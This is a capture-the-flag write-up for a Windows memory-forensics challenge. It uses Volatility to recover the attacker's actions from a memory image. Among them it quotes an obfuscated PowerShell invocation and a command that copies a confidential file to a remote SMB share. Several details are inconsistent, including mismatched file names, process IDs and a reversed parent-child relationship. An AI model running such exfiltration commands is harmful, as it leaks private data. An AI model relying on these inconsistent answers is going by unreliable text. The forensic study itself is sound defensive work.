# Recollection

## Challenge Information
- **Challenge Name**: Recollection
- **Category**: Memory Analysis
- **Difficulty Level**: Easy

## Initial Setup
First of all, the tool we need in this task is Volatility. Install both Volatility2 as well as Volatility3, because there are some tasks in which we have to run some commands that are not available in Volatility2. The command for Volatility2 will start with `vol.py` and that of Volatility3 will start with `vol`.

## Investigation Steps

1. Since we had to figure out the operating system's information, we will use the command of imageinfo:
```bash
vol.py -f recollection.bin imageinfo
```
This will return some information inwhich we can see a header of `Suggested Profile(s)` where the very first field represents our system profile `Win7SP1x64`. Hence, the answer is `Windows 7`.

2. Under the same information, we can clearly see the time of creation of this dump `2022-12-19 16:07:30`.

3. Since we want to get the copied data and we know that the copied data is in clipboard, so the command:
```bash
vol.py -f recollection.bin --profile=Win7SP1x64 clipboard
```
This gave us some information in which we can see the only present data `(gv '*MDR*').naMe[3,11,2]-joIN''`.

4. Now our some upcoming tasks are related to the commands that the attacker executed. So, we will run the command that will show us consoles:
```bash
vol.py -f recollection.bin --profile=Win7SP1x64 consoles
```
This will return some data, which I have also saved in the data.txt file. Here when we see the shell of task-3 executed, there is a word `iex` in the very next line of that shell. This refers to the cmdlet name `Invoke-Expression`.

5. Since our concern is with exfiltration of a file, so most probably this would be some sensitive file. Analyzing all the commands that were there, we can see a command being executed on the `Credentials.txt`, which is the actual required command:
```bash
type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
```

6. If we analyze the results of this command, we can clearly see that there were errors when the attacker tried to execute it. So the answer is `NO`.

7. If we see the next command in which the user is trying to run a powershell command, there is some base64 encoded string `ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi`. If we decode it, we will see the what actually the attacker was trying to run:
```bash
echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
```
So the path of the file is very clear in this command `"C:\Users\Public\Office\readme.txt"`

8. Since we get to know about the host machine, so lets just take some information of the machine by running the command:
```bash
vol.py -f recollection.bin --profile=Win7SP1x64 hivelist
```
This will give us the addresses of the machines. The address of `\REGISTRY\MACHINE\SYSTEM` can be clearly seen as `0xfffff8a000024010`. Now using this offset, run the command:
```bash
vol.py -f recollection.bin --profile=Win7SP1x64 printkey -o 0xfffff8a000024010 -K "ControlSet001\Services\Tcpip\Parameters"
```
This will give detailed information of this machine, where we can see the username of the machine `user-PC`.

9. For the number of users, it is there as `QualifyingDestinationThreshold` which is `3`.

10. Since our concern is with the passwords.txt file, so lets just run the command:
```bash
vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep "passwords.txt"
```
This will give us the information of the files of which we have given the grep filter. In our case, there is only one file `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`.

11. Since the executable is named with its hash, and there is only one such file in the data that we also saved in data.txt, `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1`.

12. In this task, we have to find the IMPHASH of the above malicious file. For this, we will be using a python script dump.py. But for this, we need the file itself. So we will first dump this file. Now to dump any file from the bin, we need its offset and the exact size of the file. The size of the file is given in data.txt. To find the offset, we will run `filescan` on this file using the command:
```bash
vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```
Now, we can dump the file using the dumpfiles:
```bash
vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011fa45c20 -D ./
```
This will save the dump of the file in the current directory working directory. Now use the following code to get the IMPHASH `d3b592cd9481e4f053b5362e22d61595`:

```python
import pefile
pe = pefile.PE('./file.None.0xfffffa8003b62990.dat') # this is the dump of the file that was saved in my case
print(pe.get_imphash())
```

13. Use exiftool to get the detailed information of the file:
```bash
exiftool file.None.0xfffffa8003b62990.dat
```
This gave me each and every information of the file, including the required creation time `2022-06-22 11:49:04`.

14. Here, we had to figure out thr ip-address. So lets just run the command of netscan:
```bash
vol.py -f recollection.bin --profile=Win7SP1x64 netscan
```
This gave a long data in which we could observe the ip address `192.168.0.104`.

15. Now, lets list down all the processes:
```bash
vol.py -f recollection.bin --profile=Win7SP1x64 pslist
```
This will help to get the data of all the processes and their parents. Here we can observe the parent child relationship of the `cmd.exe` as a parent of `explorer.exe`.

16. To get the email, I tried so many different commands with different filters, trying to make the filter more precise with the required format of the email. At last:
```bash
strings recollection.bin | grep -E -o "\b[A-Za-z0-9._%+-]+-[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,3}m\b"
```
This worked giving 7 results, in which one was `a65bded5-284b-407b-86df-db3050f7f451mafia_code1337@gmail.com` but the attacker had added some extra contents to maybe bypass any checks. The exact email was `mafia_code1337@gmail.com`.

17. Since we know that the microsoft edge process is running on the process id 2032 (form task-15), we can use the command:
```bash
vol.py -f recollection.bin --profile=Win7SP1x64 memdump -p 2380 -D ./
```
To dump the data of this process. Now:
```bash
strings 2380.dmp | grep -i "siem"
```
This will help us give the string that include siem. This have a little big data, in which there was a file `wazuh-agent-4.3.10-1.msi`. Hence, the SIEM solution id `Wazuh`.

18. I don't have any solid reason that why do I think this was the file, but since there was mentioned that there is a typo and the name is mimicking, I could see one suspecious file in the data.txt where all the exe files are listed with the time of their creation `csrsss.exe`.
